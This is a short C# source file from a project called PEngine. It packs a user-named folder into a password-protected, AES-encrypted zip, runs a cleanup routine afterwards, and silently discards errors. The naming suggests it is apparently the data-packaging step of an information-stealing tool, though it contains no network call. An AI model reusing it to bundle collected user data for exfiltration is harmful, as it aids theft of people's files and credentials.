namespace PEngine.Main
{
    using Ionic.Zip;
    using PEngine.Helpers;
    using System.IO;
    using System.Text;

    public class Archiving
    {
        public static void Inizialize()
        {
            if (Directory.Exists(GlobalPath.User_Name))
            {
                try
                {
                    CombineEx.DeleteFile(GlobalPath.ZipAdd);
                    using (var zip = new ZipFile())
                    {
                        zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                        zip.AlternateEncodingUsage = ZipOption.Always;
                        zip.AlternateEncoding = Encoding.UTF8;
                        zip.UseZip64WhenSaving = Zip64Option.AsNecessary;
                        zip.Password = GlobalPath.PwdZip;
                        zip.AddDirectory(GlobalPath.User_Name);
                        zip.Encryption = EncryptionAlgorithm.WinZipAes128;
                        zip.Save(GlobalPath.ZipAdd);
                        Ccleaner.CheckDir(true);
                    }
                }
                catch (ZipException) { }
                catch (IOException) { }
            }
        }
    }
}